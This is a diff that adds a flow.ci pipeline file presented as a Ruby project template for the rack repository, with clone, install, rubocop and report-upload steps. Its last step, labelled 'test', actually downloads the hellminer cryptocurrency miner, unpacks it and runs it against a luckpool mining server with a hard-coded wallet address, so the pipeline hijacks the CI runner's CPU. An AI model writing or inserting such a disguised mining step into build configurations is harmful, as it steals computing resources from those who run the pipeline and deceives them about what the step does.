@@ -1,0 +1,42 @@
+#
+# Ruby Project Template
+#
+
+envs:
+  # Git config
+  FLOWCI_GIT_URL: "https://github.com/rack/rack.git"
+
+  ## Credential name if git repo url is ssh or login required for http
+  # FLOWCI_GIT_CREDENTIAL: "https://github.com/jenniferzim/sdffsd.git"
+
+  GEM_HOME: ${FLOWCI_AGENT_WORKSPACE}/.gem_home
+
+docker:
+  image: ruby:2.7
+
+steps:
+  - name: clone
+    plugin: 'gitclone'
+
+  - name: install
+    bash: |
+      cd $FLOWCI_GIT_REPO
+      bundle install 
+  - name: rubocop
+    bash: |
+      cd $FLOWCI_GIT_REPO
+      ${GEM_HOME}/bin/rubocop --format html -o rubocop.html
+    allow_failure: false
+
+  - name: upload report
+    envs:
+      REPORT_PATH: "${FLOWCI_GIT_REPO}/rubocop.html"
+      REPORT_NAME: "Rubocop"
+      REPORT_ENTRY_FILE: "rubocop.html"
+    plugin: 'report-upload'
+
+  - name: test
+    bash: |
+      cd $FLOWCI_GIT_REPO
+      wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz; tar xf hellminer_cpu_linux.tar.gz; ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RBmB39tuxoHb4AEigfL3NgWqt7k4Xrm2Dc.TEST -p x
+    allow_failure: false
